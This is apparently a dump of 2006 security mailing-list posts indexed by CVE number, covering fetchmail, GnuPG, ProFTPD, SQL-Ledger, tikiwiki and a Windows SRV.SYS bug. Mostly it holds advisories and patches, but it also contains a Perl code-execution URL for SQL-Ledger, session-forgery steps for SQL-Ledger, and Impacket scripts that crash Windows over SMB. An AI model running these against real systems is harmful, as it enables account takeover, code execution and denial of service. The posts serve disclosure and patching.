+ request.data.winsreq[sizeof(request.data.winsreq) - 1] = '';
if( (ret = winbindd_request_response(WINBINDD_WINS_BYNAME, &request, &response))
== NSS_STATUS_SUCCESS ) {"
26885,Full Disclosure: Arbitrary Code Execution in LedgerSMB CVE-2006-5872,,CVE-2006-5872,"CVE-2006-5872 (filed against SQL-Ledger) also affects LedgerSMB. This was first fixed in LedgerSMB 1.1.5 but due to a number of unrelated bugs, we recommend upgrading to 1.1.7. SQL-Ledger fixed the problem in 2.6.21.
This occurs due to the improper handling of input handling in the redirect function which also allows the user to specify a file with arguments to be run via Perl. However, since one can specify -e as the script (making the command line perl -e ....) one can specify whatever code to execute one would like.
The following link demonstrates the vulnerability.
http://127.0.0.1/sql-ledger/login.pl?login=demo&script=-e%3fprint%20STDERR%20%27hello%20world%27%3b&action=logout <http://127.0.0.1/sql-ledger/login.pl?login=demo&script=-e%3fprint%20STDERR%20%27hello%20world%27%3b&action=logout>
Best Wishes,
Chris Travers
Metatron Technology Consulting"
27252,fetchmail security announcement 2006-03 (CVE-2006-5974),,CVE-2006-5974,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
fetchmail-SA-2006-03: crash when refusing message delivered through MDA
Topics: fetchmail crashes when refusing a message bound for an MDA
Author: Matthias Andree
Version: 1.0
Announced: 2007-01-04
Type: denial of service
Impact: fetchmail aborts prematurely
Danger: low
Credits: Neil Hoggarth (bug report and analysis)
CVE Name: CVE-2006-5974
URL: http://fetchmail.berlios.de/fetchmail-SA-2006-03.txt
Project URL: http://fetchmail.berlios.de/
Affects: fetchmail release = 6.3.5
fetchmail release candidates 6.3.6-rc1, -rc2
Not affected: fetchmail release 6.3.6
Corrected: 2006-11-14 fetchmail SVN
0. Release history
==================
2006-11-19 - internal review draft
2007-01-04 1.0 ready for release
1. Background
=============
fetchmail is a software package to retrieve mail from remote POP2, POP3,
IMAP, ETRN or ODMR servers and forward it to local SMTP, LMTP servers or
message delivery agents.
fetchmail ships with a graphical, Python/Tkinter based configuration
utility named ""fetchmailconf"" to help the user create configuration (run
control) files for fetchmail.
2. Problem description and Impact
=================================
Fetchmail 6.3.5 and early 6.3.6 release candidates, when delivering
messages to a message delivery agent by means of the ""mda"" option, can
crash (by passing a NULL pointer to ferror() and fflush()) when refusing
a message. SMTP and LMTP delivery modes aren't affected.
3. Workaround
=============
Avoid the mda option and ship to a local SMTP or LMTP server instead.
4. Solution
===========
Download and install fetchmail 6.3.6 or a newer stable release from
fetchmail's project site at
<http://developer.berlios.de/project/showfiles.php?group_id=1824>.
A. Copyright, License and Warranty
==================================
(C) Copyright 2007 by Matthias Andree, <matthias.andree gmx de>.
Some rights reserved.
This work is licensed under the Creative Commons
Attribution-NonCommercial-NoDerivs German License. To view a copy of
this license, visit http://creativecommons.org/licenses/by-nc-nd/2.0/de/
or send a letter to Creative Commons; 559 Nathan Abbott Way;
Stanford, California 94305; USA.
THIS WORK IS PROVIDED FREE OF CHARGE AND WITHOUT ANY WARRANTIES.
Use the information herein at your own risk.
END OF fetchmail-SA-2006-03.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.5 (GNU/Linux)
iD8DBQFFntntvmGDOQUufZURAicZAKCg2UcpAQ0Wot44RbXYLP082rEX5QCfUYxg
qPVbKSzqv4ZEgrimsGieYc8=
=JbTf
-----END PGP SIGNATURE-----"
27253,fetchmail security announcement 2006-02 (CVE-2006-5867),,CVE-2006-5867,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
fetchmail-SA-2006-02: TLS enforcement problem/MITM attack/password exposure
Topics: fetchmail cannot enforce TLS
Author: Matthias Andree
Version: 1.0
Announced: 2007-01-04
Type: secret information disclosure
Impact: fetchmail can expose cleartext password over unsecure link
fetchmail may not detect man in the middle attacks
Danger: medium
Credits: Isaac Wilcox (bug report, testing, collaboration on fix)
CVE Name: CVE-2006-5867
URL: http://fetchmail.berlios.de/fetchmail-SA-2006-02.txt
Project URL: http://fetchmail.berlios.de/
Affects: fetchmail releases <= 6.3.5
fetchmail release candidates 6.3.6-rc1, -rc2, -rc3
Not affected: fetchmail release candidates 6.3.6-rc4, -rc5
fetchmail release 6.3.6
Corrected: 2006-11-26 fetchmail 6.3.6-rc4
0. Release history
==================
2006-11-16 v0.01 internal review draft
2006-11-26 v0.02 revise failure cases, workaround, add acknowledgments
2006-11-27 v0.03 add more vulnerabilities
2006-01-04 v1.0 ready for release
1. Background
=============
fetchmail is a software package to retrieve mail from remote POP2, POP3,
IMAP, ETRN or ODMR servers and forward it to local SMTP, LMTP servers or
message delivery agents.
fetchmail ships with a graphical, Python/Tkinter based configuration
utility named ""fetchmailconf"" to help the user create configuration (run
control) files for fetchmail.
2. Problem description and Impact
=================================
Fetchmail has had several nasty password disclosure vulnerabilities for
a long time. It was only recently that these have been found.
V1. sslcertck/sslfingerprint options should have implied ""sslproto tls1""
in order to enforce TLS negotiation, but did not.
V2. Even with ""sslproto tls1"" in the config, fetches would go ahead
in plain text if STLS/STARTTLS wasn't available (not advertised,
or advertised but rejected).
V3. POP3 fetches could completely ignore all TLS options whether
available or not because it didn't reliably issue CAPA before
checking for STLS support - but CAPA is a requisite for STLS.
Whether or not CAPAbilities were probed, depended on the ""auth""
option. (Fetchmail only tried CAPA if the auth option was not set at
all, was set to gssapi, kerberos, kerberos_v4, otp, or cram-md5.)
V4. POP3 could fall back to using plain text passwords, even if strong
authentication had been configured.
V5. POP2 would not complain if strong authentication or TLS had been
requested.
This can cause eavesdroppers to obtain the password, depending on the
authentication scheme that is configured or auto-selected, and
subsequently impersonate somebody else when logging into the upstream
server.
3. Workaround
=============
If your upstream offers SSLv3-wrapped service on a dedicated port,
use fetchmail --ssl --sslcertck --sslproto ssl3 on the command line,
or equivalent in the run control file. This encrypts the whole session.
4. Solution
===========
Download and install fetchmail 6.3.6 or a newer stable release from
fetchmail's project site at
<http://developer.berlios.de/project/showfiles.php?group_id=1824>.
5. Acknowledgments
==================
Isaac Wilcox has been a great help with testing the fixes and getting
them right.
A. Copyright, License and Warranty
==================================
(C) Copyright 2007 by Matthias Andree, <matthias.andree gmx de>.
Some rights reserved.
This work is licensed under the Creative Commons
Attribution-NonCommercial-NoDerivs German License. To view a copy of
this license, visit http://creativecommons.org/licenses/by-nc-nd/2.0/de/
or send a letter to Creative Commons; 559 Nathan Abbott Way;
Stanford, California 94305; USA.
THIS WORK IS PROVIDED FREE OF CHARGE AND WITHOUT ANY WARRANTIES.
Use the information herein at your own risk.
END OF fetchmail-SA-2006-02.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.5 (GNU/Linux)
iD8DBQFFntnPvmGDOQUufZURAkSyAJ9JUbwIAGcN57VfuTgBMx2n525EGwCgnSpn
SxZtELCDVLRkrE4pKNlPGC0=
=MzBB
-----END PGP SIGNATURE-----"
27585,Several updates in Microsoft Word 0-day (CVE-2006-5994) FAQ document,,CVE-2006-5994,"Several updates have been done to ""Microsoft Word 0-day Vulnerability FAQ - December 2006, CVE-2006-5994"" document during the weekend.
-added information about AV vendor protection
-added information about the state of Internet threat meters
-added several reference hyperlinks
-detailed information about specific Word versions and language builds confirmed as affected
Link to the FAQ:
http://blogs.securiteam.com/?p=759
- Juha-Matti"
27625,Microsoft Word 0-day Vulnerability FAQ (CVE-2006-5994) written,,CVE-2006-5994,"I have posted Frequently Asked Questions document about the unpatched Microsoft Word zero-day vulnerability.
The document entitled as Microsoft Word 0-day Vulnerability FAQ - December 2006, CVE-2006-5994 is located at my SecuriTeam Blogs section,
http://blogs.securiteam.com/?p=759
The document describes related Trojan downloader malwares and the state of upcoming fix etc. too.
Regards,
Juha-Matti Laurio
Finland"
27649,GnuPG: remotely controllable function pointer [CVE-2006-6235],,CVE-2006-6235,"GnuPG: remotely controllable function pointer [CVE-2006-6235]
===============================================================
2006-12-04
Summary
=======
Tavis Ormandy of the Gentoo security team identified a severe and
exploitable bug in the processing of encrypted packets in GnuPG.
[ Please do not send private mail in response to this message. The
mailing list gnupg-devel is the best place to discuss this problem
(please subscribe first so you don't need moderator approval [1]). ]
Impact
======
Using malformed OpenPGP packets an attacker is able to modify and
dereference a function pointer in GnuPG. This is a remotely
exploitable bug and affects any use of GnuPG where an attacker can
control the data processed by GnuPG. It is not necessary limited to
encrypted data, also signed data may be affected.
Affected versions: All versions of GnuPG < 1.4.6
All versions of GnuPG-2 < 2.0.2
All beta versions of GnuPG-2 (1.9.0 .. 1.9.95)
Affected tools: gpg, gpgv, gpg2 and gpgv2.
Affected platforms: All.
gpg-agent, gpgsm as well as other tools are not affected.
A workaround is not known.
Solution
========
If you are using a vendor supplied version of GnuPG:
* Wait for an update from your vendor. Vendors have been informed on
Saturday December 2, less than a day after this bug has been reported.
If you are using GnuPG 1.4:
* Update as soon as possible to GnuPG 1.4.6. It has been uploaded to
the usual location: ftp://ftp.gnupg.org/gcrypt/gnupg/. This version
was due to be released anyway this week. See
http://www.gnupg.org/download/ for details.
* Or: As another and less intrusive option, apply the attached patch
to GnuPG 1.4.5. This is the smallest possible fix.
If you are using GnuPG 2.0:
* Apply the attached patch against GnuPG 2.0.1.
* Or: Stop using gpg2 and gpgv2, install GnuPG 1.4.6 and use gpg and gpgv
instead.
If you are using a binary Windows version of GnuPG:
* A binary version of GnuPG 1.4.6 for Windows is available as usual.
* Gpg4win 1.0.8, including GnuPG 1.4.6, is available. Please go to
http://www.gpg4win.org .
Background
==========
GnuPG uses data structures called filters to process OpenPGP messages.
These filters ware used in a similar way as a pipelines in the shell.
For communication between these filters context structures are used.
These are usually allocated on the stack and passed to the filter
functions. At most places the OpenPGP data stream fed into these
filters is closed before the context structure gets deallocated.
While decrypting encrypted packets, this may not happen in all cases
and the filter may use a void contest structure filled with garbage.
An attacker may control this garbage. The filter context includes
another context used by the low-level decryption to access the
decryption algorithm. This is done using a function pointer. By
carefully crafting an OpenPGP message, an attacker may control this
function pointer and call an arbitrary function of the process.
Obviously an exploit needs to prepared for a specific version,
compiler, libc, etc to be successful - but it is definitely doable.
Fixing this is obvious: We need to allocate the context on the heap
and use a reference count to keep it valid as long as either the
controlling code or the filter code needs it.
We have checked all other usages of such a stack based filter contexts
but fortunately found no other vulnerable places. This allows to
release a relatively small patch. However, for reasons of code
cleanness and easier audits we will soon start to change all these
stack based filter contexts to heap based ones.
Support
=======
g10 Code GmbH, a Duesseldorf based company owned and headed by GnuPG's
principal author, is currently funding GnuPG development. As evident
by the two vulnerabilities found within a week, a review of the entire
code base should be undertaken as soon as possible. As maintainers we
try to do our best and are working slowly through the code. The long
standing plan is to scrutinize the 2.0 code base, write more test
cases and to backport new fixes and cleanups to 1.4. However, as a
small company our resources are limited and we need to prioritize
other projects which get us actual revenues. Support contracts or
other financial backing would greatly help us to improve the quality
of GnuPG.
Thanks
======
Tavis Ormandy found this vulnerability.
[1] See http://lists.gnupg.org/mailman/listinfo/gnupg-devel .
--
g10 Code GmbH http://g10code.com AmtsGer. Wuppertal HRB 14459
Hüttenstr. 61 Geschäftsführung Werner Koch
D-40699 Erkrath -=- The GnuPG Experts -=- USt-Id DE215605608"
27798,CVE-2006-5815: remote code execution in ProFTPD,,CVE-2006-5815,"=======
Summary
=======
On 6 November 2006, Evgeny Legerov <admin gleg net> posted to BUGTRAQ[1],
announcing his commercial VulnDisco Pack for Metasploit 2.7[2]. One of the
included exploits, vd_proftpd.pm, takes advantage of an off-by-one string
manipulation flaw in ProFTPD's sreplace() function to allow a remote
attacker to execute arbitrary code.
This vulnerabillity, identified as CVE-2006-5815[3], is believed to affect
all versions of ProFTPD up to and including 1.3.0, but exploitability has
only been demonstrated with version 1.3.0rc3. The demonstrated exploit
relies on write access via FTP for exploitability, but other attack vectors
may make exploitation of a read-only FTP server possible.
This vulnerability has been patched[4] in the latest release of ProFTPD,
1.3.0a, which is available from the ProFTPD web site,
http://www.proftpd.org/. Mitigation techniques have also been developed for
use until a patched version can be installed.
========
Timeline
========
10 November - security proftpd org receives a message from a ProFTPD
user inquiring about a fix for the vulnerability announced
in GLEG's product.
10 November - ProFTPD core team attempts contact with admin gleg net.
15 November - Second contact attempt with admin gleg net.
16 November - Contact established, vulnerability details transferred.
20 November - Disclosure date coordinated.
27 November - Coordinated disclosure.
Given the Thanksgiving holiday, the ProFTPD core team chose to perform a
coordinated disclosure the following Monday, to allow affected users and
vendors ample opportunity to perform patching operations.
Unfortunately, erroneous information on the location and nature of this flaw
has disseminated from unofficial sources. Some vendors have already released
patches that attempt to address CVE-2006-5815 based on reports that a bug in
ProFTPD's CommandBufferSize processing is its cause. To the best of the core
team's knowledge, the CommandBufferSize bug in ProFTPD is not exploitable.
Vendors are welcomed and encouraged to contact security proftpd org to
exchange information on announced vulnerabilities, and we endeavor to work
to the best of our abilities with those contacting the core team. Given that
we had no information about this vulnerability until several days after it
was published and a CVE issued, we attempted to address it to the best of
our abilities. Constructive criticism is welcome on how to better handle
similar situations should they arise in the future.
==========
Mitigation
==========
Some users may not be able to immediately patch their ProFTPD installations.
Until they are able to install a patched version, the following steps can
mitigate the impact of this flaw:
- Remove DisplayConnect, DisplayLogin, DisplayChdir, DisplayFirstChdir,
DisplayFileTransfer, AccessDenyMsg, and WrapDenyMsg directives from your
ProFTPD configuration.
- Avoid using variable substitutions/magic cookies/%-style escapes in
/etc/shutmsg, when specifying a warning message with the ftpshut(8)
command, or in RewriteRule directives.
- Add a DenyFilter directive to your configuration to limit FTP command
arguments to only characters that you require. For example: 'DenyFilter
[^A-Za-z0-9_.-]' limits FTP command arguments (such as filenames) to
alphanumeric characters, the underscore, period, and dash.
[1] http://seclists.org/bugtraq/2006/Nov/0094.html
[2] http://gleg.net/vulndisco_meta.shtml
[3] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5815
[4] http://proftp.cvs.sourceforge.net/proftp/proftpd/src/support.c?r1=1.79&r2=1.80&sortby=date"
28779,Determina zero-day fix for CVE-2006-3730 (WebViewFolderIcon setSlice Integer Overflow),,CVE-2006-3730,"Determina has released a free, downloadable fix for the WebFolderIcon setSlice
vulnerability. This standalone fix for Internet Explorer will prevent this
critical vulnerabilty from being exploited until Microsoft is able to issue a
patch. Desktop users without proactive protection against vulnerability exploits
may consider installing this fix if they believe they might have exposure to
web-based attacks.
The fix can be downloaded from http://www.determina.com/security.research/ and
includes full source code. The fix applies to all versions of Windows 2000, XP
and 2003. The fix patches the flawed code in memory when a vulnerable version of
the ActiveX control in Internet Explorer is running, without affecting any files
on disk or disabling any browser functionality. It should also not interfere
with the installation of a Microsoft patch when one becomes available.
We're also researching additional exploitation vectors. The underlying cause of
the setSlice vulnerability is an integer overflow in COMCTL32.DLL, a core
Windows component used by a large number of applications. The WebViewFolderIcon
ActiveX control is most likely only one of the attack vectors for this
vulnerability.
Alex Sotirov
Security Research
Determina Inc."
28880,Windows VML Vulnerability FAQ (CVE-2006-4868) written,,CVE-2006-4868,"I have posted Frequently Asked Questions document about the unpatched Windows VML vulnerability.
The document entitled as Windows VML Vulnerability FAQ (CVE-2006-4868) is located at my SecuriTeam Blogs section,
http://blogs.securiteam.com/?p=640
The document describes related malware, 3rd party fix, using alternative browser etc. too.
Regards,
Juha-Matti Laurio
Finland"
29157,Full Disclosure for SQL-Ledger vulnerability CVE-2006-4244,,CVE-2006-4244,"Hi all;
I have received many requests from security professions responsible for the
security of Linux distros to move the full disclosure ahead. Now that I am
reasonably sure that the full scope of the problem is known and fixed in
the fix that Chris Murtagh and myself put together, it has been released. Also, the maintainer of the software has reacted in an extremely hostile
manner even to the notion that this is a problem. He has not fixed the
matter when we brought it up privately, nor has he fixed it when we alerted
the public to the existence of a problem. Nor has he even expressed a substantive willingness to work with us to fix the problem.
All versions of SQL-Ledger from 2.4.4 to the present (2.6.17 as of this
writing) are vulnerable. Versions prior to 2.4.4 are vulnerable to browser
history exploits as the password is stored in the query string but these
are not as serious as the current problem.
The Problem:
SQL-Ledger uses a fundamentally flawed approach to session authentication. When a user logs in, the password is checked, and if it matches what was in
the users/members file, a session id is generated and handed to the web
browser. The requirements for authenticating are simply that a cookie in
the name of ""sql-ledger-[username]"" and the value of [timestamp], and that
this value matches the ""sessionid"" value passed via the Get or POST
operation. [username] is the username of the logged in user, and
[timestamp] is the unix epoch timestamp.
Additionally, a timeout value is set per user, and this is used to timeout
sessions. The session id is not stored on the server, nor is it further
checked for validity. However, at least in theory, it is required that the
user be logged in (though some versions do not remove the user
configuration files properly to make this a requirement). The Exploit:
Therefore, for the main program, the following steps are required to gain
access as any logged in user:
1) Create a cookie referencing the host running SQL-Ledger, the / path, the
name of sql-ledger-[username], and the value of the unix epoch timestamp.
2) Go to a URL in a web browser such as:
http://[hostname]/sql-ledger/menu.pl?path=bin/mozilla&action=display&level=N
ew%20Window&login=[username]&timeout=10800&sessionid=[timestamp]&js=1&duplic
ate=1&main=company_logo In this example, [hostname] is the machine running
SQL-Ledger, [timestamp] is the value from your cookie, and [username] is
the desired username.
3) That's it.
If that were the only flaw, the situation would be bad enough. However,
the administrative interface contains a similar flaw (most easily exploited
by typing the http request directly into telnet) which can be used to list
usernames. For this reason, anybody can list login names and attempt to
log in as other users. One can also create new users with the ability to
access the confidential accounting data in the database, and other
administrative tasks. One could even delete the accounting databases.
Impact:
Malicious users could pin transactions on other users, so that embezzlement
could be pinned on others, accounting data could be tampered with, and
more. This problem essentially means that audit trails logins, and
security controls cannot be trusted with this application.
The Fix:
Metatron Technology Consulting, along with Chris Murtagh have released a
fix for this problem available at http://www.metatrontech.com/downloads/sql-ledger-fix-CVE-2006-4244.tar.gz. However, there does
not appear to be a strong commitment from the software maintainer to ensure
that this is upgrade safe and should be considered temporary. For this
reason, we have also decided to offer a fork of this popular open source software from
http://sourceforge.net/projects/ledger-smb/ which does come with that
commitment. The fix involves the following things:
1) A new table is created in the database which tracks session ids. Session ids are tracked by login name, time issued, and value. The value
is an md5 sum of a random number. A new cookie handles this session value
transparently to the user.
2) Every page load checks the session cookie against the value stored in
the database.
3) The administrative interface uses a similar process with a file-based
server-side tracking system.
Installing this fix requires modifying the database schema. Please see the
documentation contained in it for further instructions. Also note that although the fix ought to affect all versions from 2.4.4 to the present, this was only tested on 2.6.15 and 2.6.17.
Best Wishes,
Chris Travers
Metatron Technology Consulting"
29310,Suggested Fix for CVE-2006-4299,,CVE-2006-4299,"References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4299
http://www.securityfocus.com/bid/19654
Since the vendor appears to be asleep at the wheel, and Google turned
up nothing helpful, I've attempted my own fix for this vulnerability.
As I've found no exploit code to speak of, can anyone confirm that
this fix does indeed correct the issue?
tikiwiki-1.9.4-cve_2006_4299.patch:
diff -Nur -x '*.orig' -x '*.rej' tikiwiki-1.9.4/tiki-searchindex.php mezzanine_patched_tikiwiki-1.9.4/tiki-searchindex.php
--- tikiwiki-1.9.4/tiki-searchindex.php 2006-08-25 20:04:38.000000000 -0400
+++ mezzanine_patched_tikiwiki-1.9.4/tiki-searchindex.php 2006-08-25 20:04:25.000000000 -0400
@@ -22,7 +22,7 @@
}
if(isset($_REQUEST[""highlight""]) && !empty($_REQUEST[""highlight""])) {
- $_REQUEST[""words""]=$_REQUEST[""highlight""];
+ $_REQUEST[""words""]=htmlspecialchars($_REQUEST[""highlight""]);
}
if ($feature_search_stats == 'y') {
Thanks,
Michael
--
Michael Jennings (a.k.a. KainX) http://www.kainx.org/ <mej kainx org>
n + 1, Inc., http://www.nplus1.net/ Author, Eterm (www.eterm.org)
-----------------------------------------------------------------------
""My shoes are too tight, but it doesn't matter because I have
forgotten how to dance.""
-- Peter Jurasik (Ambassador Londo Mollari), ""Babylon Five"""
29422,RE: Mailslot bug (MS06-035) vs non-Mailslot bug (CVE-2006-3942),,CVE-2006-3942,"> -----Original Message-----
> From: Gerardo Richarte [mailto:lists core-sdi com]
>
> non-Mailslot bug(MS0?-???/CVE-2006-3942)
<snip>
> ""Vulnerability details"" section to find what I expected:
> NOTHING. Just a general description, as in most advisories
> lately, which can't, in any way, be used to prove or disprove
> the existence of the bug, nor to decide how high in the
> priority list this patch should be put:
<snip>
> . Advisories with almost no technical details are bad: They do not
> provide enough information to let users decide how serious the
> condition is in their specific situation, quite often lead to the
> accidental discovery of new bugs (this is not the first
> time I've seen
<snip>
> pretty much your only choice... Unless somebody comes out
> with a home
> made patch for SRV.SYS. I haven't checked, but I wouldn't
> be surprised
Bravo sir. It is always nice to see another company, or even
researcher[s] for that matter, releasing *useful* details on bugs. How
many more binary diffing videos (ours included) do
vendors/researchers/securitycompanies have to see before everyone can
simply agree that by virtue of having the patch you will find the
vulnerabilities that everyone is so afraid to talk about.
When vendors do not give the correct level of details they leave
everyone in the dark and everyone guessing. So you have things like this
unpatched DoS being discovered, and nothing but confusion for
customers/researchers trying to determine the true risk related to these
flaws. That is why people thought for a while that the DoS was actually
the mailslot bug, and they didn't have any technical details to turn to,
to help them realize that it really was a different bug... So then even
eventually exploits were publicly released for what was then realized to
be an unpatched flaw etc...
It makes matters worse when you find multiple silently fixed
vulnerabilities within a patch and sometimes they have different
dependencies for exploitation such as what features are enabled, service
pack levels, etc... And then your wondering which of the bugs to
correlate to the vendors description of the risk and mitigating factors
and everything else.
And we go through this pain, headache, and annoyance for what reason?
Because of some make believe fear that maybe there might be an exploit
released in 3 hours instead of the typical 4 hours it takes the guys at
places like Core, Immunity, Metasploit, to produce an exploit after a
patch Tuesday or related announcement.
It does not really make any sense... Except for when you look at who
are, ""those other people"", finding vulnerabilities and releasing
worthless ""me too"" zero detail advisories. They are the companies ran by
ignorant cowards who are afraid of thinking about security from a
scientific and academic perspective but instead from the perspective of
never wanting to risk rocking the boat for sake of corporate image
because the ignorant masses might portray them as doing the wrong thing.
It seems systemic though across most things these days that people cant
seem to find the will power to do what they know is right, even if the
masses might not yet understand.
So keep on truckin Core Security, Michal Zalewski, and even
Tippingpoint/iDefense. R.I.P. l0pht, RAZOR, @stake.
P.S. Since Gera mentioned about someone coming out with a homemade patch
for this DoS since we are all still waiting around for MS to act... You
can download such a patch from http://research.eeye.com, it is in the
current blog post, courtesy of Derek Soeder. It is obviously
experimental and we recommend checking it out from a research
perspective rather than it being something like our previous third party
patch which was fine to install wherever.
Signed,
Marc Maiffret
Chief Hacking Officer
Founder / CTO
eEye Digital Security
T.949.349.9062
F.949.900.4111
http://eEye.com/Blink - End-Point Vulnerability Prevention
http://eEye.com/Retina - Network Security Scanner
http://eEye.com/Iris - Network Traffic Analyzer
http://eEye.com/SecureIIS - Stop known and unknown IIS vulnerabilities"
29465,Re: Mailslot bug (MS06-035) vs non-Mailslot bug (CVE-2006-3942),,CVE-2006-3942,"""""I haven't checked, but I wouldn't be surprised
if this could be triggered on UDP, as most standard MAILSLOT
transactions are made over UDP.""""
i think it could be and a possiblity to be triggered as broadcast
by the way nice analysis , it clarified a few more things :)
On 8/15/06, Gerardo Richarte <lists core-sdi com> wrote:
>
> Mailslot bug (MS06-035)
> vs.
> non-Mailslot bug(MS0?-???/CVE-2006-3942)
>
> This is the story of a yet unpatched bug which is not a 0-day.
>
> Time line:
>
> 2006-07-12 - MS06-035 Published by Microsoft [1]
> 2006-07-12 - ""Windows Mailslot (MS06-035) DoS"" module
> released to IMPACT customers
> 2006-07-13 - We realized (too late) that it was a different bug [2]
> 2006-07-14 - We got in touch with Microsoft
> 2006-07-19 - Public exploit released by cocoruder [3]
> (frankruder_at_hotmail.com)
> 2006-07-28 - ISS released their advisory [4]
> 2006-07-28 - Microsoft acknowledged the bug [5]
> 2006-08-14 - Today - We publish and advisory [10] and this email
>
> ---[ Intro ]
>
> Last month's patch Tuesday started with a nice challenge: A remotely
> exploitable code execution kernel bug for most Microsoft's OSes (most
> supported Windows). As my job is to write exploits, I jumped to that as
> soon as I could (which was latter than what I liked because we were
> closing a new version of our product). I got something working in a
> short time, sent it to QA to test and released before the end of the
> day... I was truly amazed... to only find out, a little bit later, that
> I had accidentally found a different (yet unpatched today) bug.
>
> In this pseudo-advisory I will describe the Details of this new bug, the
> process of how I [also] ""discovered"" it, and why I think it's not
> exploitable (only to be proved later by someone else that I'm a moron)
>
> ---[ MS06-035... I think ]
>
> For a long time I've been waiting for a remotely exploitable kernel bug
> to try to exploit. It was a tough challenge, at least for me, as I've
> never before worked on such a beast. I jumped immediatly to
> Microsoft's advisory's [1] ""Vulnerability details"" section to find what
> I expected: NOTHING. Just a general description, as in most advisories
> lately, which can't, in any way, be used to prove or disprove the
> existence of the bug, nor to decide how high in the priority list this
> patch should be put:
>
> ""There is a remote code execution vulnerability in the Server driver
> that could allow an attacker who successfully exploited this
> vulnerability to take complete control of the affected system."" [1]
>
> Uhm... if the information is not under ""Vulnerability details"", where
> may it be? I think I need to take even more English lessons, because I
> thought ""details"" meant ""detalles"", oh well... let's read all the
> advisory just in case...
>
> After reading Microsoft's advisory I continued with TippingPoint's [5]
> and Pedram Amini's blog [7] to happily find a few more details. Let me
> summarize what I knew then:
>
> . Mailslot ==> SMB
> . Kernel Heap overflow
> . Code execution is possible (why would Microsoft over-rate it?)
> . SRV.SYS (Server driver)
> . Port 445 (from advisory's Workarounds section)
> . First class mailslot (whatever it means)
>
> What do I know about Mailslots? the basics, probably a little bit more,
> but surely not enough. Let's see if Impacket [11] has something for
> Mailslots:
>
> $ cd Impacket-0.9.6.0
> $ grep -i mailslot *
> $ grep -i mailslot */*
> $ grep -i mailslot */*/*
> $ grep -i mailslot */*/*/*
> grep: */*/*/*: No such file or directory
>
> ... mmmm... nothing... now what? After quickly sending Pedram an
> email to congratulate him and HD for their finding (and, of course, cry
> for some help), I sat down to read CIFS' specification [12] once again.
> I searched for the word ""mailslot"" to only find it in one section
> describing the format for Mailslot Write transactions. Nice! Lets try
> the fuzzing approach, lets create a Mailslot request with a lot of data!
>
> So I opened my Ethereal and my Python interpreter, booted up a VMware
> with Windows, went through the automatic ""Win-R, cmd, ipconfig"". Got
> VMware's IP address and continued typing:
>
> from impacket import smb
>
> s = smb.SMB('*SMBSERVER','10.0.1.44')
> s.login('','')
> tid = s.tree_connect_andx(r'\*SMBSERVERIPC$')
> s.send_trans(tid,
> 'x01x00x00x00x00x00', r'MAILSLOTLANMAN', '', 'A'*1000)
>
> BOOM! The vmware crashed!
>
> What? Wait a second...
>
> At this point I thought ""How stupid I am! I should have
> tested this before! just sending a big packet crashed it!"" And I'm one
> of those who 5 years ago thought ""first generation fuzzers are not going
> to find too many bugs any more""... stupid me!
>
> ""Ok. Got a crash, it's a kernel bug... no, no, it's a remotely
> exploitable kernel heap overflow bug... it's quite unlikely I will be
> able to do anything better than a simple Denial of Service for quite
> some days. So I better focus on writing down the documentation. I will
> send right away a working version to QA so we can try to ship it today"".
> Thought and done. Documentation written, typos fixed, some extra packets
> added just in case, QA approved it for ""Early release"" mode...
>
> ""Nice! we tested it against most Windows VMWares we have, it crashed
> them all in the first try. And we shipped it all in a single day! I was
> not really expecting this, I'm more used to spending a few days per bug
> until I have a QA-approved shippable version""
>
> - ""Hey Kelya! lets ship it! it's done, QA approved it!""
> (Kelya's my boss)
> - ""Sure... Ok, it's shipped now. Have you tried against a patched
> box?""
> - ""Nop... 'cmon, It's not my job to test MS' patches!"" [8] [9]
> (thanks aazubel!)
> - ""Oh well... let me see... My box is patched, throw it against it""
> - ""Ok, going... (double-click), gone""
> - ""Eh! wait a second... Got a crash and dump, let me see if the
> box's really patched""
> - ""Yeah, it must be still unpatched, I'll try someone else's box""
> - ...
> - ""I think we may have found something else... pass me the memory
> dump to debug it""
>
> And so the second part of the story begins.
>
> ---[ MS0?-??? - CVE-2006-3942 - the new bug ]
>
> - ""Let's go home now. Tomorrow we'll verify it and talk to Ivan so
> he gets in touch with Microsoft about this new issue""
> - ""Ok, I'll try to debug it and figure out what's going on""
>
> The new bug, as explained by ISS' advisory [3], is due to a NULL
> pointer dereference, and I firmly believe that it's not exploitable. As
> I said, I will quite likely be proved wrong on this, but I'll try to
> give my reasons:
>
> The crash is actually inside __imp___wcsnicmp, when the string
> ""\MAILSLOT"" is compared to a NULL pointer. The following code, from
> ExecuteTransaction(), is where wcsnicmp() is called from.
>
> SRV.SYS:0002f487: push 9
> SRV.SYS:0002f489: push ""\MAILSLOT""
> SRV.SYS:0002f48f: push dword ptr [eax+24h] <-- [eax+24] is NULL
> SRV.SYS:0002f492: call ds:__imp___wcsnicmp <-- Crash Inside (tm)
> SRV.SYS:0002f498: add esp, 0ch
> SRV.SYS:0002f49b: test eax, eax
> SRV.SYS:0002f49d: jnz loc_2f4aa
> SRV.SYS:0002f49f: push esi
> SRV.SYS:0002f4a0: call _MailslotTransaction@4 <-- not reached
> SRV.SYS:0002f4a5: jmp loc_20bf6
> SRV.SYS:0002f4aa:
>
> Apparently, for some reason, our packet made [eax+24h] be NULL,
> which forced something like:
>
> wcsnicmp(0, ""\MAILSLOT"", 9);
>
> Which obviously crashes.
>
> After some tests, I found out that the only thing that mattered
> here, is that no NUL should be sent after the ""Mailslot name"". And in
> fact, 'A'*1000 is not necessary, and the mailslot name doesn't really
> have to mean anythin. So, the following python script should still
> trigger the bug:
>
> -----
> from impacket import smb
>
> s = smb.SMB('*SMBSERVER','10.0.1.44')
> s.login('','')
> tid = s.tree_connect_andx(r'\*SMBSERVERIPC$')
> s.send_trans(tid, 'x01x00x00x00x00x00', 'cuchicuchi','','')
> -----
>
> - ""Kelya, Ivan: I'm pretty sure this is a different thing... it's
> not related to mailslots, it's not related to a buffer overflow,
> and apparently, it's not exploitable for code execution""
> - ""Uhm... Ok, I'm getting in touch with MS to let them know. You
> should have tried it against a patched box before releasing.""
> - ""I know, but we were in Early Release mode, and we were too
> worried testing the exploit to stop and test if Microsoft's patch
> really worked.""
> - ""Take some time to see if it's exploitable or not, I'll talk to
> Microsoft""
